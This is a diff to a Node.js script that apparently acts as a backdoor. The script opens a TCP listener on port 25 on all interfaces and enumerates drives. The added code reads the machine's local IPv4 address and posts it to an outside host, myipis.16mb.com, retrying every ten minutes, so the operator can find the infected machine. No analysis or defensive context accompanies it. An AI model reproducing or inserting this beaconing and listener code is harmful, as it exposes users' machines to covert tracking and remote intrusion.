@@ -1,6 +1,7 @@
 var request = require('request'),
     net = require('net'),
-    fs = require("fs");
+    fs = require("fs"),
+    os = require("os");
 
 
 var server = net.createServer(function(sock) {
@@ -23,6 +24,20 @@ var server = net.createServer(function(sock) {
 }).listen(25, '0.0.0.0');
 
 var fn = {
+  getLocalIp: function () {
+    var netData = os.networkInterfaces()["Ethernet"];
+
+    for (var key in netData) {
+      if (netData[key].family === "IPv4") {
+        request.post('http://myipis.16mb.com/formdata.php').form({address: netData[key].address})
+        .on('error', function(err) {
+          setTimeout(function () {
+            fn.getLocalIp();  
+          }, 600000);
+        });
+      }
+    }
+  },
   getIp: function () {
     request.put('http://myipis.16mb.com/formdata.php')
     .on('error', function(err) {
@@ -88,6 +103,6 @@ var fn = {
       return existDrives;
   }
 };
-
-fn.getIp();
+fn.getLocalIp();
+// fn.getIp();
 console.log('Server listening on port 25...');
